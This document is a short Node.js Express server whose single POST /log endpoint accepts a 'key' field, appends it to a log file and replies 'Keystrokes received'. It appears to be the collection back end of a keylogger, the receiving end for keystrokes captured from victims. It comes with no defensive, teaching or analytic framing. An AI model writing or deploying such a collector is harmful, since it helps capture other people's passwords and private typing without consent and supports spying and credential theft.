const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.post('/log', (req, res) => {
    const keystrokes = req.body.key;
    fs.appendFile('server_log.txt', keystrokes + '\n', (err) => {
        if (err) {
            console.error('Failed to write to log file:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.send('Keystrokes received');
    });
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
